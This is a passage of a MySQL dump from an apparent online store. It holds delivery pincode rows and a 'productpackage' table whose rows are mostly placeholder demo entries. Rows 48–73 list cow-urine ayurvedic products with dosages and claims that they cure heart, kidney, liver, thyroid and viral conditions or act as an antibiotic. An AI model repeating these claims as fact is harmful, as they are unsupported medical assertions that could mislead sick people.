(226, '560068', 50, '560068', 0, 2, 0),
(225, '560067', 50, '560067', 0, 2, 0),
(224, '560066', 50, '560066', 0, 2, 0),
(223, '560065', 50, '560065', 0, 2, 0),
(222, '560064', 50, '560064', 0, 2, 0),
(221, '560063', 50, '560063', 0, 2, 0),
(220, '560062', 50, '560062', 0, 2, 0),
(219, '560061', 50, '560061', 0, 2, 0),
(218, '560060', 50, '560060', 0, 2, 0),
(217, '560059', 50, '560059', 0, 2, 0),
(216, '560058', 50, '560058', 0, 2, 0),
(215, '560057', 50, '560057', 0, 2, 0),
(214, '560056', 50, '560056', 0, 2, 0),
(213, '560055', 50, '560055', 0, 2, 0),
(212, '560054', 50, '560054', 0, 2, 0),
(211, '560053', 50, '560053', 0, 2, 0),
(210, '560052', 50, '560052', 0, 2, 0),
(209, '560051', 50, '560051', 0, 2, 0),
(208, '560050', 50, '560050', 0, 2, 0),
(207, '560049', 50, '560049', 0, 2, 0),
(206, '560048', 50, '560048', 0, 2, 0),
(205, '560047', 50, '560047', 0, 2, 0),
(204, '560046', 50, '560046', 0, 2, 0),
(203, '560045', 50, '560045', 0, 2, 0),
(202, '560044', 50, '560044', 0, 2, 0),
(201, '560043', 50, '560043', 0, 2, 0),
(200, '560042', 50, '560042', 0, 2, 0),
(199, '560041', 50, '560041', 0, 2, 0),
(198, '560040', 50, '560040', 0, 2, 0),
(197, '560039', 50, '560039', 0, 2, 0),
(196, '560038', 50, '560038', 0, 2, 0),
(195, '560037', 50, '560037', 0, 2, 0),
(194, '560036', 50, '560036', 0, 2, 0),
(193, '560035', 50, '560035', 0, 2, 0),
(192, '560034', 50, '560034', 0, 2, 0),
(191, '560033', 50, '560033', 0, 2, 0),
(190, '560032', 50, '560032', 0, 2, 0),
(189, '560031', 50, '560031', 0, 2, 0),
(188, '560030', 50, '560030', 0, 2, 0),
(187, '560029', 50, '560029', 0, 2, 0),
(186, '560028', 50, '560028', 0, 2, 0),
(185, '560027', 50, '560027', 0, 2, 0),
(184, '560026', 50, '560026', 0, 2, 0),
(183, '560025', 50, '560025', 0, 2, 0),
(182, '560024', 50, '560024', 0, 2, 0),
(181, '560023', 50, '560023', 0, 2, 0),
(179, '560021', 50, '560021', 0, 2, 0),
(178, '560020', 50, '560020', 0, 2, 0),
(177, '560019', 50, '560019', 0, 2, 0),
(176, '560018', 50, '560018', 0, 2, 0),
(175, '560017', 50, '560017', 0, 2, 0),
(174, '560016', 50, '560016', 0, 2, 0),
(173, '560015', 50, '560015', 0, 2, 0),
(172, '560014', 50, '560014', 0, 2, 0),
(171, '560013', 50, '560013', 0, 2, 0),
(170, '560012', 50, '560012', 0, 2, 0),
(169, '560011', 50, '560011', 0, 2, 0),
(168, '560010', 50, '560010', 0, 2, 0),
(167, '560009', 50, '560009', 0, 2, 0),
(166, '560008', 50, '560008', 0, 2, 0),
(165, '560007', 50, '560007', 0, 2, 0),
(164, '560006', 50, '560006', 0, 2, 0),
(163, '560005', 50, '560005', 0, 2, 0),
(162, '560004', 50, '560004', 0, 2, 0),
(161, '560003', 50, '560003', 0, 2, 0),
(160, '560002', 50, '560002', 0, 2, 0),
(159, '560001', 50, '560001', 0, 2, 0),
(316, '573127', 300, '573127', 1, 345, 0),
(317, '577006', 100, '577006', 0, 2, 0),
(320, '530068', 50, '530068', 0, 2, 0),
(322, '571235', 100, '571235', 0, 4, 0),
(323, '587766', 100, '587766', 0, 2, 0),
(326, '560022', 100, '560022', 1, 2, 0),
(327, '577001', 100, '577001', 1, 341, 0);

-- --------------------------------------------------------

--
-- Table structure for table `productpackage`
--

CREATE TABLE `productpackage` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `pcode` varchar(50) NOT NULL,
  `mrp` int(11) NOT NULL,
  `sellingprice` int(11) NOT NULL,
  `stock` int(11) NOT NULL,
  `overview` text NOT NULL,
  `mdesc` text NOT NULL,
  `sname` varchar(160) NOT NULL,
  `svalue` varchar(255) NOT NULL,
  `package_id` int(11) NOT NULL,
  `psize` varchar(100) NOT NULL,
  `home_page` tinyint(2) NOT NULL,
  `bundle_products` tinyint(2) NOT NULL,
  `thumbimg` varchar(230) NOT NULL,
  `simg` varchar(230) NOT NULL,
  `mimg` varchar(230) NOT NULL,
  `limg` varchar(230) NOT NULL,
  `status` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `how_to_use` text NOT NULL,
  `youtube` varchar(50) NOT NULL,
  `youtubelink` varchar(150) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `productpackage`
--

INSERT INTO `productpackage` (`id`, `pid`, `pcode`, `mrp`, `sellingprice`, `stock`, `overview`, `mdesc`, `sname`, `svalue`, `package_id`, `psize`, `home_page`, `bundle_products`, `thumbimg`, `simg`, `mimg`, `limg`, `status`, `created_date`, `modified_date`, `how_to_use`, `youtube`, `youtubelink`) VALUES
(1, 178, 'demo', 123, 212, 21, 'dme', 'mdoe', 'dmeo', 'mdoe', 1, '', 1, 0, '', '', '', '', 0, '2022-02-11 14:41:30', '2022-04-06 05:32:30', '', '', ''),
(2, 178, 'demo1', 200, 190, 20, 'dem', 'omdeo', 'dmeo', 'mdeo', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 14:41:30', '0000-00-00 00:00:00', '', '', ''),
(3, 179, 'dd', 123, 2222, 22, 'demo', 'de', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(4, 180, 'De123', 200, 180, 20, 'Demo', 'demo', 'dmeo', 'mdoe', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(5, 181, 'dem', 12, 200, 12, 'dem', 'dme', 'dd', 'dd', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:14:56', '2022-02-13 18:55:39', '', '', ''),
(6, 181, 'ddd', 123, 22, 22, 'de', 'de', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:14:56', '2022-02-13 18:55:39', '', '', ''),
(7, 181, 'd', 12, 22, 2, 'dd', 'd', 'ddd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:14:56', '2022-02-13 18:55:39', '', '', ''),
(8, 182, 'dem', 12, 200, 12, 'dem', 'dme', 'dd', 'dd', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:19:31', '0000-00-00 00:00:00', '', '', ''),
(9, 182, 'ddd', 123, 22, 22, 'de', 'de', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:19:31', '0000-00-00 00:00:00', '', '', ''),
(10, 182, 'd', 12, 22, 2, 'dd', 'd', 'ddd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:19:31', '0000-00-00 00:00:00', '', '', ''),
(11, 183, 'dem', 12, 200, 12, 'dem', 'dme', 'dd', 'dd', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:21:28', '0000-00-00 00:00:00', '', '', ''),
(12, 183, 'ddd', 123, 22, 22, 'de', 'de', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:21:28', '0000-00-00 00:00:00', '', '', ''),
(13, 183, 'd', 12, 22, 2, 'dd', 'd', 'ddd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:21:28', '0000-00-00 00:00:00', '', '', ''),
(14, 184, 'dem', 12, 200, 12, 'dem', 'dme', 'dd', 'dd', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:23:39', '2022-02-13 18:55:03', '', '', ''),
(15, 184, 'ddd', 123, 22, 22, 'de', 'de', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:23:39', '2022-02-13 18:55:03', '', '', ''),
(16, 184, 'd', 12, 22, 2, 'dd', 'd', 'ddd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:23:39', '2022-02-13 18:55:03', '', '', ''),
(17, 185, 'dem', 12, 200, 12, 'dem', 'dme', 'dd', 'dd', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:24:43', '2022-02-13 18:57:48', '', '', ''),
(18, 185, 'ddd', 123, 22, 22, 'de', 'de', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:24:43', '2022-02-13 18:57:48', '', '', ''),
(19, 185, 'd', 12, 22, 2, 'dd', 'd', 'ddd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:24:43', '2022-02-13 18:57:48', '', '', ''),
(20, 186, 'dem', 12, 200, 12, 'dem', 'dme', 'dd', 'dd', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:27:38', '2022-02-12 15:00:08', '', '', ''),
(21, 186, 'ddd', 123, 22, 22, 'de', 'de', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 18:27:38', '2022-02-12 15:00:08', '', '', ''),
(22, 187, 'ddww', 223, 23, 21, 'demo', 'dmeo', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:31:14', '2022-02-12 14:58:34', '', '', ''),
(23, 188, 'ddd', 123, 2222, 22, 'dmeo', 'mdoe', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(24, 189, 'ddd', 123, 2222, 22, 'dmeo', 'mdoe', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(25, 190, 'ddd', 123, 2222, 22, 'dmeo', 'mdoe', 'dmeo', 'mdoe', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(26, 191, 'ddd', 350, 300, 22, 'dmeo', 'mdoe', '', '', 7, '', 0, 1, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(27, 192, 'demo', 250, 230, 21, 'dmeo', 'mdoe', 'dd', 'dmeo', 1, '', 0, 1, '', '', '', '', 0, '2022-02-11 20:49:45', '2022-02-15 12:39:38', '', '', ''),
(28, 192, 'd123', 233, 233, 20, 'dmeo', 'mdoe', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:49:45', '2022-02-12 14:56:51', '', '', ''),
(29, 192, 'ddww', 55, 661, 55, 'dd', 'ff', 'dd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:49:45', '2022-02-12 14:56:51', '', '', ''),
(30, 193, 'gog', 300, 290, 10, 'dddmeo', 'ddmdoe', 'dd', 'dmeo', 1, '', 0, 1, '', '', '', '', 0, '2022-02-12 09:08:43', '2022-02-14 15:32:50', '', '', ''),
(31, 193, 'demo', 1233, 22, 22, 'dmeo', 'mdoe', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:49:51', '2022-02-14 10:37:01', '', '', ''),
(32, 193, 'ddww', 55, 661, 55, 'dd', 'ff', 'dd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:49:51', '2022-02-14 10:37:01', '', '', ''),
(33, 194, 'demo', 123, 212, 21, 'dmeo', 'mdoe', 'dd', 'dmeo', 1, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:55:36', '2022-02-12 14:52:30', '', '', ''),
(34, 194, 'd123', 233, 233, 20, 'dmeo', 'mdoe', 'dmeo', 'de', 2, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:55:36', '2022-02-12 14:52:30', '', '', ''),
(35, 194, 'ddww', 55, 661, 55, 'dd', 'ff', 'dd', 'dd', 3, '', 0, 0, '', '', '', '', 0, '2022-02-11 20:55:36', '2022-02-12 14:52:30', '', '', ''),
(36, 194, 'ddd', 123, 2222, 22, 'dmeo', 'ff', 'dd', 'dd', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(37, 193, 'ddd', 33, 20, 10, 'dem', 'ff', 'dd', 'dd', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(38, 195, 'GOG1233', 301, 281, 9, 'DEMOS', 'DEMOS', 'DMEO', 'DMEO', 1, '', 0, 1, '', '', '', '', 0, '2022-02-12 11:48:34', '2022-02-14 10:01:02', '', '', ''),
(39, 195, 'GOG4503', 3021, 20, 12, 'DEMOS', 'DEMO', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-12 11:48:34', '2022-02-14 10:01:02', '', '', ''),
(40, 195, 'DEMO', 300, 233, 10, 'DEMO', 'DEMO', 'DMEO', 'MDOE', 3, '', 0, 0, '', '', '', '', 0, '2022-02-12 11:48:34', '2022-02-14 10:01:02', '', '', ''),
(43, 198, 'GGA-GA-G-001-01', 50, 45, 100, 'Helps in Digestive System Process', 'Helps in Digestive System Process', 'Demo', 'dmeo', 1, '', 0, 0, '', '', '', '', 0, '2022-02-14 15:55:39', '2022-02-14 18:32:42', '', '', ''),
(44, 198, 'GGA-GA-S-001-01', 45, 40, 100, 'Helps in Digestive System Process', 'Helps in Digestive System Process', 'demo', 'dmeo', 2, '', 0, 0, '', '', '', '', 0, '2022-02-14 15:55:39', '2022-02-14 18:32:42', '', '', ''),
(46, 200, 'ddd', 122, 22, 12, 'dd', 'd', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(47, 201, 'GOG89', 23, 22, 12, 'dem', 'demo', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(48, 202, 'GGA-KA-G-001', 150, 150, 10, 'Stomach and skin diseases', 'Stomach and skin diseases', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:07:55', '2022-02-15 12:20:49', '', '', ''),
(49, 203, 'GGA-KA-G-001', 200, 200, 10, '<p>Kashaya Amrutham is processed with Desi Cows Gomutra. It helps In curing various health problems. Improves digestion, Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Anise, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 12:11:46', '2022-03-30 09:16:33', '<p>Dosage: Take 15 ml Ark, twice a day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 min of taking this medicine or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(50, 203, 'GGA-KA-S-001', 150, 150, 10, '<p>Kashaya Amrutham is processed with desi Cows Gomutra. It helps in curing various health problems. Improves digestion, Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Anise, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:11:46', '2022-03-30 09:16:33', '<p>Dosage: Take 15 ml Ark, twice a day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 min of taking this medicine or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(51, 203, 'GGA-KA-N-001', 145, 145, 10, '<p>Kashaya Amrutham is processed with Desi Cows Gomutra. It helps In curing various health problems. Improves digestion, Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Anise, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:11:46', '2022-03-30 09:16:33', '<p>Dosage: Take 15 ml Ark, twice a day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 min of taking this medicine or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(52, 204, 'GGA-KA-G-002', 200, 200, 10, '<p>Is processed with Desi Cows Gomutra. &nbsp;It is useful in Arthritis &amp; is good for joint-related disorders.<br />\r\n&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGomutra ark, Harisringar, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 12:32:51', '2022-03-30 06:49:02', '<p>Dosage: Ake 15 Ml Ark, twice A day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 Min of taking this medicine. Or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(53, 204, 'GGA-KA-S-002', 150, 150, 10, '<p>Is processed with Desi Cows Gomutra. &nbsp;It is useful in Arthritis &amp; is good for joint-related disorders.<br />\r\n&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGomutra ark, Harisringar, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:32:51', '2022-03-30 06:49:02', '<p>Dosage: Ake 15 Ml Ark, twice A day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 Min of taking this medicine. Or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(54, 204, 'GGA-KA-N-002', 120, 120, 10, '<p>Is processed with Desi Cows Gomutra. &nbsp;It is useful in Arthritis &amp; is good for joint-related disorders.<br />\r\n&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGomutra ark, Harisringar, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:32:51', '2022-03-30 06:49:02', '<p>Dosage: Ake 15 Ml Ark, twice A day. Take early in the morning (with an Empty Stomach) and at night before going to bed. A patient having bile acidity is to take this medicine with water. Do not eat or drink before and after 30 Min of taking this medicine. Or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(55, 205, 'GGA-KA-G-002', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and Helps Reduces Joint Pain', 'Gogarbha is prepared with purified cow urine and Helps Reduces Joint Pain', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:39:59', '2022-02-18 11:38:57', '', '', ''),
(56, 205, 'GGA-KA-S-002', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and Helps Reduces Joint Pain', 'Gogarbha is prepared with purified cow urine and Helps Reduces Joint Pain', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:39:59', '2022-02-18 11:38:57', '', '', ''),
(57, 205, 'GGA-KA-N-002', 150, 150, 10, 'Gogarbha is prepared with purified cow urine and Helps Reduces Joint Pain', 'Gogarbha is prepared with purified cow urine and Helps Reduces Joint Pain', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:39:59', '2022-02-18 11:38:57', '', '', ''),
(58, 206, 'GGA-KA-G-003', 150, 150, 10, '<p>Helps in curing liver &amp; kidney-related problems. Helps in urinary tract infection, Kidney problems, Prostate problems, increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Punarnava,&nbsp; Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 12:49:31', '2022-03-30 06:46:15', '<p>Dosage: Take 15 ml in the morning &amp; evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(59, 206, 'GGA-KA-S-003', 150, 150, 10, '<p>Helps in curing liver &amp; kidney-related problems. Helps in urinary tract infection, Kidney problems, Prostate problems, increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Punarnava, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:49:31', '2022-03-30 06:46:15', '<p>Dosage: Take 15 ml in the morning &amp; evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(60, 206, 'GGA-KA-N-003', 150, 150, 10, '<p>Helps in curing liver &amp; kidney-related problems. Helps in urinary tract infection, Kidney problems, Prostate problems, increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Punarnava, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:49:31', '2022-03-30 06:46:15', '<p>Dosage: Take 15 ml in the morning &amp; evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(61, 207, 'GGA-KA-G-004', 250, 250, 10, '<p>Helps in curing cough, cold, viral infection, thyroid, sore throat, fever. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Tulasi, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 1, '', '', '', '', 0, '2022-02-15 12:55:35', '2022-03-30 09:17:45', '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(62, 207, 'GGA-KA-S-004', 230, 230, 10, '<p>Helps in curing cough, cold, viral infection, thyroid, sore throat, fever. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Tulasi, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:55:35', '2022-03-30 09:17:45', '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(63, 207, 'GGA-KA-N-004', 200, 200, 10, '<p>Helps in curing cough, cold, viral infection, thyroid, sore throat, fever. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow urine, Tulasi, Fennel seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 12:55:35', '2022-03-30 09:17:45', '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(64, 208, 'GGA-KA-G-005', 350, 350, 10, '<p>Helps in curing heart problems, balancing cholesterol, controlling blood pressure, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Arjun, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 13:07:03', '2022-03-30 06:44:51', '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(65, 208, 'GGA-KA-S-005', 300, 300, 10, '<p>Helps in curing heart problems, balancing cholesterol, controlling blood pressure, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Arjun, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 13:07:03', '2022-03-30 06:44:51', '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(66, 208, 'GGA-KA-N-005', 250, 250, 10, '<p>Helps in curing heart problems, balancing cholesterol, controlling blood pressure, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Arjun, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 13:07:03', '2022-03-30 06:44:51', '<p>Dosage: Take 15 ml in the morning and evening on an empty stomach with water or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(67, 209, 'GGA-KA-G-006', 150, 150, 10, '<p>Helps in reducing weight. Acts as an antibiotic agent in our body. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Saffron, Anise, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 13:55:02', '2022-03-30 06:44:18', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(68, 209, 'GGA-KA-S-006', 100, 100, 10, '<p>Helps in reducing weight. Acts as an antibiotic agent in our body. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Saffron, Anise, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 13:55:02', '2022-03-30 06:44:18', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(69, 209, 'GGA-KA-N-006', 90, 90, 10, '<p>Helps in reducing weight. Acts as an antibiotic agent in our body. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Saffron, Anise, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 13:55:02', '2022-03-30 06:44:18', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(70, 210, 'GGA-KA-G-007', 300, 300, 10, '<p>Helps in improving fertility in men and women, boosts testosterone, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Nandi Urine, Moringa leaves, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 1, 0, '', '', '', '', 0, '2022-02-15 14:04:42', '2022-03-30 06:43:33', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(71, 210, 'GGA-KA-S-007', 250, 250, 10, '<p>Helps in improving fertility in men and women, boosts testosterone, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Nandi Urine, Moringa leaves, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:04:42', '2022-03-30 06:43:33', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(72, 210, 'GGA-KA-N-007', 200, 200, 10, '<p>Helps in improving fertility in men and women, boosts testosterone, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Nandi Urine, Moringa leaves, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:04:42', '2022-03-30 06:43:33', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(73, 211, 'GGA-KA-G-008', 150, 150, 10, '<p>Helps in curing kidney and gall bladder stone problems. Increases immunity.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Cow Urine, Pashanbhed, Fennel Seeds, Cumin</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '', 0, 0, '', '', '', '', 0, '2022-02-15 14:10:29', '2022-03-30 06:41:19', '<p>Dosage: Take 15 ml mixed with water twice a day, morning and evening on an empty stomach or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
